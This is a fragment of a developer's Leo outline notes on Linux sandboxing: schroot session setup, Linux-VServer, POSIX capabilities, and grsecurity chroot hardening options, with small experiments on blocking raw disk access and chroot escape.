        lvm-snapshot
    
    root-users=user1,user2
        list of users allowed root access to the chroot
    
    run-setup-scripts=true/false
    
    session managed chroots?
    
    source chroot options
        automatically create a copy of themselves before use
        session managed
    
        supported chroot types
                file
            LVM snapshot chroots

USAGE SUMMARY
    delete sessions
        schroot -e --all-sessions

    chroot tarball has to have the chroot root as the first level
        tar -C jaunty/ -zcvf jaunty.tar.gz .

    example session
        SESSION_ID=$(schroot -b -c &lt;session-chroot&gt;)
        schroot -r -c $SESSION_ID
        schroot -e -c $SESSION_ID

        recover session
            schroot --recover-session -c $SESSION_ID

    if you modify the source of a chroot - the change is persistent
        the tarball seems to be repackaged

    if you don't use session management, the session is torn down after use
    
    /etc/schroot/setup.d
        how the session is setup
            mount binds the root's /home and /tmp   
            copies resolv.conf

    debug
       --debug=notice option

    query config options as seen by schroot
        schroot --config

        prettier version
            schroot -i

    gotchas
        session managed chroots need the setup scripts - otherwise it doesn't work

    # erase all sessions
    schroot -e --all-sessions
    
example of a chroot configuration
    [foo]
    type=file
    description=foo
    file=/usr/share/chroot/jaunty.tar.gz
    users=z
    root-users=z

Q: can we use a directory instead of a file for a session managed chroot?
A: no
    
RESOURCE: https://wiki.ubuntu.com/DebootstrapChroot
    sbuilder            tool for building Debian binary packages from Debian sources
        part of a suite of programs
            wanna-build
            build

        can work in chroots

        schroot
            can    

RESOURCE: schroot(1) man page
schroot supports arbitrary users with PAM authentication

a regular user can chroot into the chroot as root

RESOURCE: schroot.conf man page

RESOURCE: schroot-setup(5)
    describes schroot setup.d scripts
        sets up mounts, networking</t>
<t tx="zaril.20100923035316.12">after caching

create
        2 seconds (uncompressed)
        17 seconds (compressed)

extract
    6 seconds compressed
    4-6 seconds uncompressed</t>
<t tx="zaril.20100923035316.13">SUMMARY
    very mature project, under active development
        first public release 2001
    more efficient than virtualization
    very good documentation

    vulnerable to devs
        some devs shouldn't be allowed

Q: can we create non-persistent environments with vserver?
Q: can vserver be "escaped"?
Q: does chroot work inside the vserver?

RESOURCE: https://lists.linux-foundation.org/pipermail/containers/
    containers are under very active development

RESOURCE: http://forums.grsecurity.net/viewtopic.php?t=1801&amp;highlight=&amp;sid=a31a551220aac5586ddae62d55836973

report that grsecurity and vserver apply together

RESOURCE: http://en.wikipedia.org/wiki/Linux-VServer

all virtual servers share the same kernel

RESOURCE: http://www.howtoforge.com/linux_vserver_debian_etch

tools already exist for installing debian into a vserver

RESOURCE: http://linux-vserver.org/Welcome_to_Linux-VServer.org

vserver + grsec patches already exist

RESOURCE: http://linux-vserver.org/Paper

nice overview of existing Linux security mechanisms
    capabilities
    resource limits
    file attributes
    file attributes
        e.g., SECRM (secure removal)

RESOURCE: http://linux-vserver.org/Frequently_Asked_Questions

vunify - hardlink on steroids
    immutable, but removable

device nodes limited in the guest


POSIX capabilities exist per process?

inheritable (I), permitted (P), effective(E)

RESOURCE: http://linux-vserver.org/Overview

other appraoches
    emulation
    paravirtualization
    native virtualization
    operating system-leve virtualization
</t>
<t tx="zaril.20100923035316.14">Q: can block devices be accessed without capabilities?

SUMMARY:
    POSIX capabilities exist per process?    
    inheritable (I), permitted (P), effective(E)

    see the capabilities of a process
        cat /proc/&lt;pid&gt;/status
            CapInh
            CapPrm
            CapEff

    file capabilities developed in -mm?

    vserver being integrated into mainline kernel
        "containers" / "namespaces"
        working together with openvz

    https://lists.linux-foundation.org/pipermail/containers/2010-September/007060.html
    
RESOURCE: http://www.linuxselfhelp.com/howtos/Secure-Programs/Secure-Programs-HOWTO-3.html

bounding set of capabilties
    which capabilities available globally

RESOURCE: capabilities(7) man page

list of all Linux capabilities

capset(2) a process may manipulate its own capability sets

libcap user library for manipulating capabilities
    comes with /sbin/
        sucap
        setpcaps
        getpcaps
        execcap
            wrapper used to limit Inheritable capabilities of a program to be executed
            IDEA: use execcap to drop privileges?

RESOURCE: http://ftp.kernel.org/pub/linux/libs/security/linux-privs/kernel-2.4/capfaq-0.2.txt

execcap 'cap_sys_admin=eip' update
    run update with only cap_sys_admin privileges

sucap updated updated execcap 'cap_sys_admin=eip' update
    start a process with limited capabilities under non-root uid

RESOURCE: http://www.linuxjournal.com/article/5737

taking advantage of linux capabilities

GOTCHA: execcap not working on my system, try in vmware?
    no relation

RESOURCE: http://lkml.org/lkml/2010/4/17/416

file capabilities developed in -mm

RESOURCE: http://linux-vserver.org/Mainline_Kernel_Virtualization

RESOURCE: http://lwn.net/Articles/179361/
    containers and lightweight virtualization


</t>
<t tx="zaril.20100923035316.15">SUMMARY
    we can't mknod without preventing some packages which need to create device nodes
        this is also a problem with vserver

    which packages have files in /dev?
        base-files
        udev

    chroot is unsafe with all of these devices
    
    sub-chroots actually do work
        what doesn't work is chrooting OUT of the chroot

    chroot_caps=1 prevents raw access to harddrive

pros
    decreased memory usage
    less cpu overhead
    host access to filesystems
    we can delete the dangerous devices just to make sure
    we can leverage deck to provide sessions
        thats what I designed it for
    we can apply grsecurity policies to the inside of the chroot

cons
    integration problems are likely to be painful
    not everything works inside the limited chroot (e.g., debootstrap)
    if we turn off grsec, we become vulnerable to jail escape
        security is thin?

        OTOH, its not a MAC feature, its a sysctl option

    I'm not sure I can trust the chroot_caps 
        its not documented that it prevents access to the harddrive
            
    hardware virtualization will run unchanged
        security compartmentalization will remain even with MAC turned off
    

Q: is the grsec chroot secure enough for building/fabrication?
A: we won't be able to debootstrap inside it
    but we should be able to build, and fabricate inside it
        set up mounts out of the chroots
            maybe turn on chroot mounts and give that capability to specific chrooted programs that need it?

Q: is a capability required for access to hda?
A:
    no, chroot_caps seems to be a special case

IDEAS
    apply policy to chrooted files?
        we wouldn't be able to clean state  
            yes we would, we just have to apply the policy to the parent directory

E: try debootstrapping with chroot restrictions
R: it failed, because it couldn't mount proc

    GOTCHA: mknod worked!
        thats because debootstrap created the /dev files BEFORE chrooting


DISCOVERY: I can't access hda in the chroot, why not?


what can't we do when they are on?
    (sub-chroot?)

would we need to harden the chroot environment?
    (e.g., delete dangerous devices)

can chroot security be applied dynamically?
    (I.e., like dropping privileges)
    
    would we need this to allow us to prevent chroot poisoning
        (I.e., non-persistent chroot)

    or could we just use deck to provide non-persistence   

if not how would we setup the build chroot?
    set it up and then activate the chroot restrictions?

IDEAS
    run experiments with grsec chroot restrictions
        is breakout prevented?

RESOURCE: kernel sec options-&gt;grsec-&gt;filesystem protections-&gt;chroot jail restrictions
    deny mounts

Q: what are the chroot hardening mechanisms?
A:
    chroot_deny_mount
    double-chroot
        chroot_deny_chroot
        chroot_deny_pivot
    enforce chdir /
        chroot_enforce_chdir
    disable suid chmod
        chroot_deny_chmod
    deny fchdir out of chroot
        chroot_deny_fchdir
    deny mknod
        chroot_deny_mknod
    attach to shm out of jail
        chroot_deny_shmat
    deny asccess to abstract AF_UNIX sockets
        chroot_deny_unix
    protect outside processes (kill, signal, fcntl, ptrace, capget, setpgid, getsid)
        chroot_findtask
    change priorities
        chroot_restrict_nice
    deny sysctl writes
        chroot_deny_sysctl

    deny dangerous capabilities
        lower's capabilities to prevent
            module insertion, raw i/o, system and net admin, rebooting system


Q: what capability is disabled by chroot_caps option that prevents access to /dev/hda?
    is it restricted by path?

    E: try to disable all capabilities
    subject /usr/bin/grtest o
        / rxi    
        -CAP_ALL
    R: we can still read /dev/hda

A: no capability is required to read /dev/hda

Q: is chroot_caps based on an implicit path-based acl? 
A: no, we can't read from /root/hda either

E: try turning off the option with sysctl inside the chroot
R: operation not permitted

IDEA: we could restrict privileges in the chroot using an inheritable policy


</t>
</tnodes>
</leo_file>
